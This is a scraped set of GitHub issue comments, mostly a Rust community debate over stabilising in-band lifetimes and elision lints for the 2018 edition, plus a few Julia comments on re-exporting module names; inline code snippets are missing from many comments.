rust/rust-lang/44524/405909842,"@friend I definitely agree. From @friend's experience with #52461, I can say that this feature is really great at introducing lifetimes in an existing codebase, in positions where there were none, with very little friction, and all the footguns were single-use lifetimes. ",,False,False,44524
rust/rust-lang/44524/405911675,"@friend Sadly that's not the case at all in codebases where the lifetimes are part of the infrastructure, such as  in , which inverts the statistics for when you need certain lifetimes explicitly. I wish we could just make entire modules generic on lifetimes, but atm that's just fantasy. ",,False,False,44524
rust/rust-lang/44524/406051438,"Can anyone who's transitioned a codebase to in-band lifetimes post the link here, so we can see if it's easier or harder for others to read? ",,False,False,44524
rust/rust-lang/44524/406051933,I have ported my crate to Rust 2018 on a branch ,,False,False,44524
rust/rust-lang/44524/406068106,"If I explicitly declare a lifetime somewhere and mean to use it again but get the name wrong, it doesn't look like there's any way the compiler will be able to catch me.  For example, suppose I refactor to add an outer lifetime that happens to have the same name as an inner one--now it will silently be converted to the outer one.  Hopefully that will be nonsensical and the compiler will yell at me then, but if it makes a kind of sense, but not the sense that I intended, then it won't be caught; and even if I'm yelled at, I might not recognize the source of the problem unless I'm extremely solid on how lifetimes work. This makes me suspect that after a year or so, the conventional wisdom, backed up by linting tools, is going to be ""always declare lifetimes explicitly"". I think the anon lifetimes are great, but I'm nervous about this one. ",,False,False,44524
rust/rust-lang/44524/406070117,"Probably too late for bikeshedding, but it would be way safer if you could where  means ""the lifetime of "", which is syntactic sugar for the long version with lifetime parameters.  Yes, that drags you into dependent types, but I think it better matches the intent, is harder to get wrong, and is more lightweight syntactically (at least if you don't need to keep referring to the lifetime in the function body). ",,False,False,44524
rust/rust-lang/44524/406077432,"This elision is pretty cool As it removes a clearly redundant copy of . It is a clear win, because there still is one copy in the , so clarity of the explicit relationship isn't lost. However, I feel that on function level the elision doesn't pull its weight. It seems inconsistent, because there's  without any  it belongs to. If these were variable declarations, it'd be change from to so the first case becomes obvious as it should, the second case is WTF. ",,False,False,44524
rust/rust-lang/44524/406080576,"You don't have an  if you are writing something like . Moreover,  can still be nested, so the provenance of a given  is still murky. However, that nesting is pretty rare so maybe it's an acceptable loss in code clarity. ",,False,False,44524
rust/rust-lang/44524/406083390,"Also, part of the motivation of these changes is to get people to stop naming every lifetime 'a or 'b. I think it's important that we explicitly encourage people to start using more meaningful lifetime names like 'foo/'inner/'impl/whatever alongside encouraging them to use in-band lifetimes, not only because that was part of the reason we did this in the first place, but also because better names would mitigate most of the legitimate disadvantages of in-band lifetimes. ",,False,False,44524
rust/rust-lang/44524/406103475,"Has this been effective at changing people's naming?  Have any of the crates using it decided to change the names from  because of it?  The example up thread doesn't seem to have done so   (Thank you for posting, @friend!) I look at that example (and the one below it) and don't think ""this is better"".  Nor do they seem like they'd be better with names that aren't just .  The former needs to put it on everything, so in a way seems like it wants a different elision rule that gives all the arguments the same lifetime as the output, and any longer name would just be noisy.  The latter really wants lifetime-of-named-argument, since using a longer name feels even more repetitive on the argument .  Going to the return just being  would be helpful, but overall a change from  to  feels overall just ""meh"" to me. (I do really like that  let this change from  to just , but that's not in-band lifetime declarations, more like an expansion of elision.) ",,False,False,44524
rust/rust-lang/44524/406111233,"Is there talk of stabilizing that usage of ? (I know there is another part of , where you'll be required to change things like  to .) It sounds like that's being left out of the current FCP. ",,False,False,44524
rust/rust-lang/44524/406134674,"It seems like what's missing is a way of visually distinguishing local in-band lifetimes from outer lifetimes. Suppose we allowed lifetimes to be declared with two apostrophes  (semantically equivalent to ). We could then make it bad style to declare local lifetimes with a double apostrophe or something like that. Alternately, we could make it convention to name locals with a  prefix or some other naming convention we can lint on. ",,False,False,44524
rust/rust-lang/44524/406262739,Found a bug with this feature that IMO should block stabilization ,,False,False,44524
rust/rust-lang/44524/406377343,@friend concern lint This should not be stabilized until we have the lint that ensures a simple typo doesn't become an undeclared single-use lifetime. ,,False,False,44524
rust/rust-lang/44524/406398444,"I've written up my experience migrating  to the new system here. It's a rather long post -- however, I've tried to summarize my general feeling at the top. ",,False,False,44524
rust/rust-lang/44524/406426194,"Nice work! One quick response to the stuff about - the reasoning behind not eliding it (in e.g.  as opposed to the currently-allowed , without any  at all) was to align type-parameter lifetime elision with reference lifetime elision. It's supposed to play the same role as  in pointing out ""there's some lifetime here, but it comes from the usual elision rules."" The point about  looking like some special -like lifetime is worth considering, though- I don't know that it came up in the RFC thread. ",,False,False,44524
rust/rust-lang/44524/406427449,"Right, the point I was trying to make is that the &amp; already indicates that so any additional indication isn't required/helpful. ",,False,False,44524
rust/rust-lang/44524/406429605,"But the &amp; doesn't signify that. &amp;Mir doesn't tell you whether Mir has a lifetime parameter, and if it does, it might be &amp;'a Mir&lt;'a&gt; or &amp;'a Mir&lt;'b&gt;. I think that  is well-established as being irrelevant and unique in other parts of the language, like  and  so I'm not too concerned about ' being misinterpreted. What worries me more is the parts about losing context of where lifetime parameters are introduced. On Thu, Jul 19, 2018 at 600 PM, Mark Rousskov notifications@friend.com wrote ",,False,False,44524
rust/rust-lang/44524/406886594,"The following code compiles with the in-band lifetimes feature Now suppose that somebody wants to add the following function to the  block In order to do that, he/she may change  into , unaware that the impl block already contains a function that uses a lifetime named . The code then becomes Compilation fails with an error that points to a place that is unrelated to the change I would like to be able to add a lifetime parameter to an impl block without having to check manually if that would ""hijack"" a lifetime already used in a method in that impl block. This problem (and other problems related to not being able to tell at a glance where a given lifetime is comming from), may be mitigated by adding a lint-protected naming convention for lifetimes. If I am correct, there is currently no consensus on what that lint should do. If we stabilize this feature before we have such a consensus, we risk that this lint is never implemented (because we fail to reach consensus) and that problems like the one mentioned above will stay. I would like the team members to consider if this risk can be accepted before deciding on stabilization. ",,False,False,44524
rust/rust-lang/44524/408140888,@friend asked me to post the patch to librustc_mir as a PR; if you're interested feel free to leave comments on it (,,False,False,44524
rust/rust-lang/44524/408456816,"TL;DR I like everything about the lifetime syntax in Rust 2018, except named lifetimes coming ""out of thin air"" because they disrupt the flow of the reader. We should extend lifetime elision rather than elide lifetime declaration. Initially being a huge fan of in-band lifetimes, after using them I've come to believe that they're wrong solution for a problem worth solving. Lifetime elision, the first step in making lifetimes more ergonomic, was an elegant solution that eliminated something like 95% of lifetime declarations in functions. Then we got anonymous lifetimes in the form of , which I really like and find useful. The final step is eliding lifetime declarations, but I fear the drawbacks outweigh the benefits. The main drawback is that by reading a method signature it's not obvious where lifetimes come from. When reading code, in-band lifetimes disrupt my flow, which is the opposite of being ergonomic. My feeling is that instead of eliding lifetime declarations, we should extend lifetime elision. Let's consider an example Lifetimes  and  are simply noise so we can make them anonymous This is much better. Unimportant lifetimes are removed. And the fact that  and  were actually declared here tells us that they (probably) bind some references together. This is useful information when reading code, and it's not terribly annoying to type either. Here's another example that I recently used in  Lifetime  doesn't tie any references together (i.e. it's unimportant) so we can just make it anonymous This is still very readable (I'd say even more so) and quite a bit easier to type. Recently I've been fixing soundness issues in  due to incorrect lifetime bindings. Here's a corrected version of the declarations that used to be the problem There's a lot of stuff going on in here, but we can immediately see that  is declared here (used only in ), while  is coming from the  above. After fighting with very tricky bugs in this relatively small file, I appreciate explicit lifetime declarations very much (but only declarations of important lifetimes that tie references together). I'm also concerned about learnability. It has been argued that in-band lifetimes would help in the pre-rigorous stage of learning Rust. But I feel it's the opposite. Consider the following code If I were still learning lifetimes in Rust, my immediate question would be Is lifetime  in  and  the same lifetime? Answer no, unless both functions are inside an  that mentions . Another example My question would be Are types  and the  different? If the second function used , would the two  be the same type? It's confusing, IMO. But if  and  were assigned to these functions then it'd be clear that those lifetimes are only relevant to each specific function. Also,  signifies that lifetimes are inputs to the function. Input lifetimes and types go inside , while input values go inside . ",,False,False,44524
rust/rust-lang/44524/408466368,"Thanks, @friend!  Definitely nice to see more examples with pervasive lifetimes. @friend concern no lint suggesting underscore lifetimes (when in-band is off) This is very similar to  but I think my feeling is slightly different.  Most of the migrations I see have a bunch of changes that are actually about , making me think that we need more experience with only having that before taking the next step. As an example,  ♠diff impl&lt;'cx, 'cg, 'gcx, 'tcx&gt; ConstraintGeneration&lt;'cx, 'cg, 'gcx, 'tcx&gt; { impl ConstraintGeneration&lt;'cx, 'cg, 'gcx, 'tcx&gt; { ",,False,False,44524
rust/rust-lang/44524/408482637,"@friend concern in-band ambiguity From the discussion so far, it doesn't seem like anyone's made a strong case (practical evidence, or reasoned argument) addressing the numerous concerns both here and in the original RFC for the inability to identity in-band lifetimes versus parent lifetimes, and the learnability issues that poses. The current attitude seems to be ""let's add some lints to try to avoid common mistakes"", but I think an important question to ask might be ""If we need to add these lints in order to avoid common foot-guns, then is this really the right solution?"" The feeling I've got from reading people's experiences with in-band lifetimes is that they don't offer significant benefit compared to other lifetime convenience features, while opening up potential for confusing mistakes, especially for beginners. This also seems quite early to be pushing for stabilisation. The 2018 preview was announced a month ago and while the features have been available for longer, there wasn't a big push to get feedback until then. Since the RFC was implemented to see what the user experience was, it seems overly-eager to be saying that we have enough information now (at least, I've only seen a handful of more detailed feedback about the feature so far).  The lifetime elision in impls feature seems less dangerous, as the declaration of a lifetime is less ambiguous there, though it potentially has the same problem as in-band lifetimes if modules can ever be parameterised by lifetimes. ",,False,False,44524
rust/rust-lang/44524/408504954,"It seems to me that, while in-band lifetimes might look nice by analogy to OCaml/Haskell-style type variable syntax, the problems we're finding with them are largely due to the far greater use of nested parametric items in Rust. Further, the examples of the extended elision and  we're seeing already increase clarity and simplicity quite a bit. They may still have the  syntax to introduce the named lifetimes, but they can still remove it entirely in some cases and when it remains it helps combat the nesting ambiguity more effectively than a lint. So while in-band lifetimes still seem like a win to me in non-nested situations, that's probably not enough to warrant including them. ",,False,False,44524
rust/rust-lang/44524/408514334,"Back in the RFC thread some people (spoilers one of them was me) were arguing that  lifetimes and  lifetimes should use strictly disjoint sets of identifiers (e.g.  lifetimes are uppercase and  lifetimes lowercase, as was originally proposed) for greater clarity. (""Enforced"" by a lint, or whatever.) The official position at the time seemed to be that it wasn't clear if there was sufficient motivation. I think the comments above mine provide some. ",,False,False,44524
rust/rust-lang/44524/408554096,"I didn't get the impression that there was insufficient motivation- the lint was planned from very early on. AIUI the issue was rather which convention to pick, and whether it was sufficient. (For instance, I don't like upper/lowercase because it seems to imply qualitatively different sorts of entities, but the competing idea of single-character vs meaningful-name is less enforceable.) ",,False,False,44524
rust/rust-lang/44524/409484229,"After reading the post by @friend I'd prefer to not get this feature. I didn't realize it before, but in-band lifetimes are similar to implicit variable declarations (no ) which languages like CoffeeScript have. I think that explicit declarations are especially valuable when we have lengthy code. Lifetime declarations aren't bothersome to write but in nested situations they add the little bit of clarity that can be crucial to understand the code correctly or understand it faster because we can see precisely where each lifetime is introduced. ",,False,False,44524
rust/rust-lang/44524/409657048,"Despite my agreement that we may not want in-band lifetimes, I would like to push back against the idea (already discussed quite a bit earlier) that the problem is with ""implicit declaration"" per se, should the opportunity arise to consider this pattern elsewhere. It's primarily the nesting and shadowing that causes the problems here- without that, the situation is nearly identical to ML-style type declarations or Prolog-style patterns, which both a) are quite nice to use and b) fit well with the way lifetimes are used. ",,False,False,44524
rust/rust-lang/44524/410306713,"PR to split the feature gate between the named and elided parts  thing I noticed in passing, while I'm still skeptical overall, I really like this symmetry  I'm not sure how to turn that aesthetic feeling into a coherent proposal... ",,False,False,44524
rust/rust-lang/44524/410415739,"Hey, I would like to give you guys some feedback about this. I think the place I am most using lifetimes is in some LLVM wrappers from a project of mine (for self-learning purposes). Well, so far I had no problem on lifetimes, I mean, I haven't found bugs yet. I would like to say I really enjoyed the idea of making lifetimes look like ""annotations"" on the code. After all, that's what they really are. Correct me if I am wrong, but they are annotations of relationship between references (and structures containing references, etc.). The only concrete lifetime is . Also, generic code on references is not monomorphized as with regular types. I think makes sense having a different treatment.  I'm having some problem figuring out what thing deallocates what, so please, don't pay attention on code correctness. ",,False,False,44524
rust/rust-lang/44524/410415926,"But well, I see the discussion is inclining into not stabilizing in-band lifetimes. I have to agree about shadowing. Anyway, I just wanted to give some feedback. ",,False,False,44524
rust/rust-lang/44524/412761829,"FYI, I've P-FCP'd the non-in-band parts of this over in ",,False,False,44524
rust/rust-lang/44524/413466932,"Since it came up in reddit as well I'll mention one downside to the current idiom lint. It recommends using anonymous lifetimes on input types that are already behind references, for example on  This was a massive diff when I tried applying the idiom lints to  because it turned all the future implementations into The first  in  seems useful because it's non-obvious that  is a reference type. The second one in  seems superfluous because the  is already limiting the lifetime of the parameter to this function call. There may be cases where having an explicit parameter here is useful, but I don't think this case is as useful to lint against as most of the other cases this lint targets. (EDIT note I wrote the  implementation from memory, it was a while ago I tried running the lints against . I'm not certain that it actually added the lifetime to , but if it didn't that's just likely to be a bug in the interaction of the lint and arbitrary self types.) ",,False,False,44524
rust/rust-lang/44524/414061107,@friend I assume by your link you mean this version of  (now deleted)? You might like #52461 (which also made extensive use of in-band lifetimes). ,,False,False,44524
rust/rust-lang/44524/414061176,"@friend IMO the idiom lint shouldn't apply to  because it's ""a custom reference type"". (a library analogue of a sigil, if you will) ",,False,False,44524
rust/rust-lang/44524/414062464,"To me, lifetimes on input types that are not connected to anything are just noise We could rewrite @friend's examples in a similar fashion as Perhaps the lint should warn only of cases where hidden reborrows really are occurring and permit elision otherwise? ",,False,False,44524
rust/rust-lang/44524/414063423,"@friend I guess the condition you're after for that distinction is ""is this lifetime used in more than one place after elision?"" which should be really easy to check in the compiler! ",,False,False,44524
rust/rust-lang/44524/414066057,"@friend That's right. So the motivation for explicit lifetime parameters was (from the language ergonomics blog post) My thinking is that we should warn of elided lifetime parameters that participate in reborrowing, but not complain when they do not. ",,False,False,44524
rust/rust-lang/44524/414069204,"Minor nit I don't see why ""reborrowing"" is used in that blog post. This is just whether elision used the lifetime or not, I'd call it a ""lifetime relationship between input and output"", not ""reborrowing"". ",,False,False,44524
rust/rust-lang/44524/414070061,"@friend would you say the lint shouldn't apply to  or  either since they're fundamentally just custom reference types with extra invariants as well? If so, should the compiler be automatically recognising these types, or would it need some form of annotation? ",,False,False,44524
rust/rust-lang/44524/414070304,"@friend I now prefer @friend's interpretation, which is far more general. ",,False,False,44524
rust/rust-lang/44524/414070558,"Yes (I like that too), but it's orthogonal, there are still situations where  could fall under the the lint, e.g. in a signature like ",,False,False,44524
rust/rust-lang/44524/414072257,"@friend I that case it seems fine, if we're going for ""should be explicit because elision used it"" (I almost want to apply that rule to  too, since it should be less verbose and maybe worth it) (nevermind, one of the original goals of elision was to allow writing literally ). ",,False,False,44524
rust/rust-lang/44524/414099895,Perhaps  or some other attribute can be used to indicate that implicit lifetimes are ok? ,,False,False,44524
rust/rust-lang/44524/414161953,"I find the  example highly persuasive, and agree that seeing the lifetime there is unhelpful. So if I'm understanding things right, then the proposed rules would be  In output position, all lifetimes must be obvious (named, , or there because of ) In input position, only the lifetimes used in the output must be visible (at most one, if using elision)  (Hmm, I think that would also mean that things like  should work, without requiring  the way that  does.) ",,False,False,44524
rust/rust-lang/44524/414406252,"IMO, this is really weird and confusing.  should be unique every time, just like  in patterns. Why are we allowing it to be used to connect lifetimes? ",,False,False,44524
rust/rust-lang/44524/414408142,"Yeah,  is a bit confusing when first learning it. But as a general rule It behaves the same as elided lifetimes in references. So your example is akin to  where the lifetimes are obviously connected. ",,False,False,44524
rust/rust-lang/44524/414409133,"I still think that's harmful to understanding/learning. For example, let's say I read the chapter about elided lifetimes, and then I go write a match match (a, b, c) {     (, 2, ) =&gt; { println!(""a == c"") } // bug     ... } Why does  work differently here? It's inconsistent. Lifetime annotations are already ""a bit confusing when first learning"". If we're going to clutter up the syntax, it'd better be a vast improvement. On Mon, Aug 20, 2018 at 201 PM Christopher Serr notifications@friend.com wrote ",,False,False,44524
rust/rust-lang/44524/414423109,"@friend That ship has already sailed. The following is valid code in stable Rust now I don't think so;  is not necessarily unique in patterns. So  means ""something goes here, but I'm too lazy to give it a name"". That something might or might not be equal to something else. It just doesn't have a name, that's all. The same applies to anonymous lifetimes. And lifetime elision just means the compiler tries to infer the obvious relationships between input and output lifetimes whenever possible, or ask the programmer for help in ambiguous cases. ",,False,False,44524
rust/rust-lang/44524/414663773,"Hmm. I haven't had time to fully catch up on this thread. I feel wary, though, of giving up on the ""use  everywhere a lifetime would appear"" rule. I feel though that there is value in having the struct declaration () match up closely with references to the struct (). That said, if I recall I made similar arguments to @friend some time back, basically claiming that the most important thing was to highlight that there is some reference somewhere. I think somewhere along the line my opinion shifted, but maybe it can shift back. =) I think for me personally Having some sign that a reference has been elided in a return value is absolutely necessary. I am confused on a regular basis by things like the  that appears here in the compiler  an indication that ""lifetimes appear in this type"" in parameters feels helpful. I definitely scan parameter lists visually in order to get a feeling for whether I will be able to easily copy or move that value into a struct etc, or whether I can easily refactor away from  to . Knowing that  itself contains references makes a difference there. I know I've been tripped up by this before (thought I could do something that turned out not to work); I'm not sure how important it really is. Finally, it's a minor point, but having explicit  is really useful in error messages, since we can highlight that  and talk about it but we've already got some other solutions there (e.g., printing the type), since sometimes we don't have a type at all. ",,False,False,44524
rust/rust-lang/44524/417705426,"Can this issue perhaps be split into multiple ones? I'm not quite sure what exactly is tracked by it right now. The  and  looks good to me, but I never set my ticky box due to ""define-on-use"" for lifetimes, which are not aligned with fundamental priorities of the language as I see them. Those priorities include reliability of code and its resistance to accidental mistakes, which are especially important for large projects written and extended by many people often unfamiliar with code they are changing. For lifetimes such separation of def and use provides duplication necessary for error detection during  addition, removal and renaming of lifetimes in impls/traits, impl/trait items and perhaps lifetime-parameterized modules in the future. ",,False,False,44524
rust/rust-lang/44524/417710234,@friend I thought it was already split?  is already stabilized (#48469) and  is in #15872. ,,False,False,44524
rust/rust-lang/44524/418228513,"I propose we cancel this p-FCP for now.  It seems like it's de facto not landing for the edition.  We can wait to gain more experience with additional lifetime elision, as @friend suggested, before reconsidering it. A bunch of situation for  in libcore ",,False,False,44524
rust/rust-lang/44524/418369954,"@friend There are also types for which writing lifetimes in parameters is not that helpful      All these types are reference types by nature, so it's kind of obvious they contain lifetimes. No need to write them out. We could argue in the same vein that the lifetime in  is not helpful because we already know every reference contains a lifetime. But since  is just syntax sugar for , we could say that for other reference types it's obvious they contain lifetimes, too. Of course, with types like  it's not obvious they contain lifetimes unless we write them out. But I also never cared about  having a lifetime so the  will only be annoying to type. I admit that lifetimes in types do come up useful in some cases. But, personally, I feel that the drawback of verbosity outweighs the benefits. One of the things I first hated about Rust is that I had to parametrize structs by lifetimes if they contained references. Storing a reference inside a struct felt like a punishment I have to write so many lifetimes now, should I have used clone or  instead? I worry that requiring lifetimes will only make the punishment worse. And references should be encouraged, not discouraged. Also, my attitude towards lifetimes was generally (and still is) I'd like to elide lifetimes as often as possible, but I don't mind helping out in the rare cases where things require assistance. This is one of the cases where I feel like the compiler wants too much help (yes, it's only for the benefit of the reader, but still). ",,False,False,44524
rust/rust-lang/44524/422197268,@friend fcp cancel ,,False,False,44524
rust/rust-lang/44524/422197809,"@friend I wonder to what degree the problem here is just ""bad"" syntax -- the  is pretty unwieldy. As to whether it's obvious whether the types you mention contain references -- I think there are a lot of times where that's not the case, for example when you're working with an unfamiliar code base, or just don't happen to be thinking about that question and hence don't catch the borrowing implied by a signature. I personally do find a visual signal of some kind to be quite helpful, but am sad that we weren't able to find something more appealing and lightweight. ",,False,False,44524
rust/rust-lang/44524/422212017,"@friend That's the only problem really  is far more unwieldy than . We tried using  everywhere in  (see #53816), but I'm not sure the end result is great. Signatures like these are not pretty I appreciate the usefulness of explicit lifetimes here, but considering the verbosity they don't seem like a net win to me. YMMV, though. My main worry is that the proliferation of lifetimes will be a step back for ergonomics and that we might have to write lifetimes more often in Rust 2018 than in Rust 2015. I'm not sure if that's really true, but it'd surely be unfortunate. ",,False,False,44524
rust/rust-lang/44524/422216179,"I'm of two minds about this I personally think it's really helpful as a reader to be able to see which types have lifetimes in them, and I like seeing . However, I am scared that we're making lifetimes ""noisier"" which will have the potential to frustrate authors and make them use owned types instead in order to avoid sticking  everywhere. ",,False,False,44524
rust/rust-lang/44524/422384048,"I still think we should make the rule ""you have to only write out lifetimes (even just ) if they're used more than once"" (i.e. elision picks them up). Why? Because only then do they become lifetime relationships. Otherwise, the function is quite universally quantified over them, which is pretty boring. ",,False,False,44524
rust/rust-lang/44524/422465451,"@friend My concern with that approach is that there's another aspect of ergonomics at play being able to easily remember what is required where. To me, it seems much easier to remember that  always gets a lifetime than to use it only in select circumstances. While  is stable, for the 2018 Edition we could consider scaling back the lint, at least initially. I'd really love to hear from @friend here; he's been pretty outspoken about this in the  past. ",,False,False,44524
rust/rust-lang/44524/422505328,"I want to speak up in favor of having some signal that there are ""hidden lifetimes"" in types. The current notation of  is not my favorite, but I don't yet have a compelling alternative. What I find is that I am constantly wanting to know whether a type contains references or not. It tells me a lot about how the type can be used types without lifetimes can be cloned or copied and stored for arbitrary amounts of type. Types with lifetimes are always temporary in scope and confined to some caller (modulo longer lived arenas like  in the compiler, which are the exception, and also readily identifiable). In the specific case of a type that appears in the return value, I find it invaluable to know if there is an elided lifetime within, since it tells me how long the borrow on  will last. I suspect that I derive outsized value from this notation because my intuitions for this stuff are stronger than most (can't imagine why that might be). But I feel like having a consistent syntax that highlights where lifetimes are and where they are not might wind up being very important for helping other users to develop these annotations. OK, let me give a few examples that I've run across recently. Just yesterday I was reading into the futures code and I saw this Now, I know that a  is an accumulation of bits of state. But I inferred from this signature that this state must not have any references associated with it and hence must be owned by . This seemed surprising to me. But when I clicked through to the definition, I saw that I was mistaken, and that indeed the  type carries references  to make matters worse, rustdoc actually hides these references, so it's actually quite hard to figure out what is going on. Anyway, then I kept reading, and I encountered this signature Here, I was confused for quite a while, because I misremembered that  carried a ""hidden"" lifetime (in fact, it was ). I knew that somehow  was supposed to ""store away"" a copy of the , so that it could notify the executor when it should be rescheduled, but I couldn't figure out how that was possible, since  carried references. It took some time for me to realize that I has misremembered and that  does not have references, so you can clone it and not be tied to any active borrow. Another example comes from the rustc source, which for a long time contained a function like this It happens that  holds a reference into , so this borrow will last as long as the return value is in use. But could you guess that? This same principle applies to compiler error messages. There, it's quite nice that we have something we can highlight to show you which reference we are talking about. e.g., we can now give errors like this Here, I imagine that we can find other solutions (and in general I'd like to work on improving these messages in lots of ways), but in general having a visual signal for where references are will always be useful to us, I think. As far as consistency goes, I think there is value in trying to close the gap between the various ways that you write types in Rust. Right now, types that appear in function signatures and those that appear in struct declarations sometimes look really different (e.g.,  vs ). If we have , then there is at least a signal telling you ""when you put this into a struct, it's going to need lifetime parameters"". (I would still like to have some way to have a single anonymous lifetime parameter of a struct, so that one could write  as well, but that's neither here nor there.) ",,False,False,44524
rust/rust-lang/44524/422506964,"@friend I agree that this is not pretty, but I'm not sure that just a plan  is really better. I personally find it a bit ""surprising"" to see things like  without any parameters, since it is relatively unusual, and it makes my mind feel like something is missing. I suspect that for newcomers to rustc it might also be hard to remember what things have lifetimes and which do not, though it's hard for me to judge. Speaking personally, I find the  there ugly but I do find it serves a purpose. Without that, when I see , my mind pattern matches it with  or other such pointer types, and those two things are quite different. I think ultimately I agree with @friend's comment here ",,False,False,44524
rust/rust-lang/44524/422510634,"I should also add that I appreciate that typing  is kind of... challenging. It feels like the sort of thing where I want an IDE that, once I type , just fills in the  or something. ) ",,False,False,44524
rust/rust-lang/44524/422516114,"@friend Did I miss a part of your comments, or did you not address the specific suggestion of only requiring explicit  when there is an implicit relationship (i.e. when elision is involved)? The elision aspect would cover that. And IMO I find that far more interesting than being able to tell whether a type is parametrized when looking at an universal function. I'd rather have IDEs and  provide an expanded version on hover, than have to write in all the lifetimes even in signatures where they're inconsequential. ",,False,False,44524
rust/rust-lang/44524/422518446,"@friend I did not specifically address that. I agree that is better than the status quo. It might be a good place to start, given the controversy of the more encompassing proposal. However, I don't find this to be true That is to say, I personally get a lot of value from knowing whether types are parameterized when looking at universal functions. Often, when somebody pings me with some lifetime error and associated source, the first thing I do is to spend a while figuring out ""where the lifetimes are"". Currently, this requires jumping through to the source of all the various types involved. I agree though that there is a cost of heavier notation. ",,False,False,44524
rust/rust-lang/44524/423182411,"Is there a lint that warns against elided lifetimes in types (I mean everywhere, not just in return position)? I'd like to see how much of an effect that has on a few projects I'm familiar with -- and if it's not too bad, it might change my opinion. ",,False,False,44524
rust/rust-lang/44524/423188838,"@friend try , I think that still has the full behaviour ",,False,False,44524
rust/rust-lang/44524/423191647,"Or even  (although I don't know if that can affect dependencies, given 's ""cap lints""). ",,False,False,44524
rust/rust-lang/44524/423228510,"Ok, I've just run the lint on all the  crates, , , and . Here's what I learned... The vast majority of the reported warnings are either missing lifetimes in return position or in . There are only a few remaining cases where we need to add lifetimes but it's no big deal, honestly. I'm pleasantly surprised by the low impact of the lint. Still, the large PR (around 550 lines were changed) submitted on  was making me feel uneasy. I thought maybe the code in  is a particularly bad example that uses lifetimes heavily. Then I went on to calculate the ratio of warnings per total lines of code in those projects. Perhaps  has a higher ratio of warnings per total lines of code? It turns out it doesn't - the ratio is not significantly higher. It's just that  is really big. I think my opinion has changed so allow me to make a 180 turn and give a 👍 for requiring lifetimes in all types. If anyone else is feeling unconvinced, I encourage you to do the same thing and try to assess the real impact of the lint. ",,False,False,44524
rust/rust-lang/44524/423234065,"In  this results in 511 warnings (from 15028 lines of code according to tokei). Scanning the output I'm relatively confident that every single warning is for an input parameter that is not connected to the output in any way, so would result in no warning for the ""explicit lifetimes when elided"" variant. ",,False,False,44524
rust/rust-lang/44524/423248835,"To be fair,  is a bit of a special case because almost all warnings come from  and . And there's a whole lot of  impls in there, which you're not supposed to implement by yourself anyway. Besides,  will soon become , which cuts the number of warnings down from 511 to 216. ",,False,False,44524
rust/rust-lang/44524/423286907,"And  will become , fixing the remaining half (see ",,False,False,44524
rust/rust-lang/44524/423728912,Undeveloped thought (By analogy to  =&gt;  patterns.) ,,False,False,44524
rust/rust-lang/44524/423805648,"Hmm, this lint produces 1514 warnings on Servo's style component alone, and the fix looks a lot more verbose and ugly ( ",,False,False,44524
rust/rust-lang/44524/423806488,"Most of them are actually unused lifetimes, as in, there's no relation with them and the output of the function... I think @friend's approach of only warning when elision actually comes at play it's way better than the current warning, getting the usefulness without the annoyance. ",,False,False,44524
rust/rust-lang/44524/423808916,@friend I frankly disagree we need explicit lifetimes in that case. ,,False,False,44524
rust/rust-lang/44524/425724525,"Here's a related pet peeve of mine. Currently, this compiles But this doesn't Sometimes requiring  and sometimes not requiring it feels inconsistent. We should pick a side either require it or don't. ",,False,False,44524
rust/rust-lang/44524/438918038,"I wonder, would it be reasonable to stabilize only in-band lifetimes on functions (not methods)? AFAICT, there is no ambiguity about where those lifetimes come from, right? ",,False,False,44524
rust/rust-lang/44524/438918526,"To be clear, I mean that we would stabilize a useful subset now as long as it is future-compatible with the rest of in-band lifetimes. ",,False,False,44524
rust/rust-lang/44524/439064046,"I question whether partially adding such a feature simplifies anything, since even if one believes leaving out lifetime declarations is a good thing, we would actually be adding more rules about where that's allowed. And it still makes situations like the following harder to read. On Thu, Nov 15, 2018, 0003 Who? Me?! &lt;notifications@friend.com wrote ",,False,False,44524
rust/rust-lang/44524/461235108,"I came across this issue when converting my code to Rust 2018 edition. I have lots of code that elides lifetimes in parameters and the  tool suggested I make make changes to add explicit lifetime annotations. Consider the following Initial code My understanding is that omitting the lifetime parameters like that is deprecated and  rewrites  as However, then I generalized the initial code ( implements  so the generalized code really is strictly more general than the previous code) When I run , it doesn't make any lifetime annotations explicit in the generalized version; it leaves the code as-is. It seems really arbitrary to me to encourage the more generic code to elide the lifetime parameters but discourage the less generic code from doing so. In general, Rust programmers need to be able to understand generic code and that means that they'll need to understand that there are potentially unseen lifetimes arguments implicitly in play when a reference type is used as the concrete type in a generic context. I think encouraging explicit lifetimes in non-generic contexts is only going to make it harder for people to understand this. Also, over the course of maintaining my ""idiomatic"" code, I found that the unnecessary-but-idiomatic explicit lifetimes actually resulted in bugs. See  in particular. That bug wouldn't have occurred if I had used the old style of eliding the lifetime. Therefore, I think we shouldn't call the use of unnecessary (according to the compiler) explicit lifetimes ""idiomatic"". I hope this can be reconsidered before JetBrains CLion replaces its ""elide lifetimes"" quick-fix with what  does. ",,False,False,44524
rust/rust-lang/44524/461324489,"@friend The difference I see between those two is that  is already visibly generic and dependent upon a type argument that may have a non- lifetime. , on the other hand, has no visible parameters and so it may not be obvious that it could be non-. ",,False,False,44524
rust/rust-lang/44524/461371064,"Re- the new ""idiomatic"" way to write that signature is which makes it explicit that the passed  parameter has a lifetime, but that it is not involved in the output (same as  does semi-implicitly with the ). If  suggested to turn  into  there instead then that is a bug in the lint. ",,False,False,44524
rust/rust-lang/44524/501923972,"What's the situation wrt. ""implicit shadowing"", between implementation and desired behavior? I was expecting this to error Just like this does With such an error requiring , we reserve the right to inherit generic parameters (both  and ) in nested items, without existing code changing behavior. ",,False,False,44524
rust/rust-lang/44524/501994478,"The RFC says an error to mention lifetimes from that outer definition (without binding them explicitly). This is again intended for future-proofing and clarity, and is an edge case. Apparently this future-proofing wasn't implemented. ",,False,False,44524
julia/JuliaLang/1986/9865041,"It would be convenient if there were a way to do this. Doing this explicitly (copy the long list of exports from A into B) is a bit ugly and error prone. I imagine any alternative would involve a new keyword though. Concretely, Gadfly is useless without symbols from Compose (and probably DataFrames), but a bunch of compulsory using statements isn't great. ",,False,False,1986
julia/JuliaLang/1986/12125581,"Actually, I would propose altering export's semantics to make this work ",,False,False,1986
julia/JuliaLang/1986/12125896,This is a very good point. I've taken to doing  at the start of any new package code that has DataFrames as a requirement. ,,False,False,1986
julia/JuliaLang/1986/22273052,"My suggestion would be , which would re-export the exported names of  (but not the unexported names!). ",,False,False,1986
julia/JuliaLang/1986/22273550,"A potential downside is that it may make discovery of exported names a bit harder. Also, I'm disinclined to support reserving another name . So, alternatively, something like  perhaps? Or  (a module name followed by a period)? ",,False,False,1986
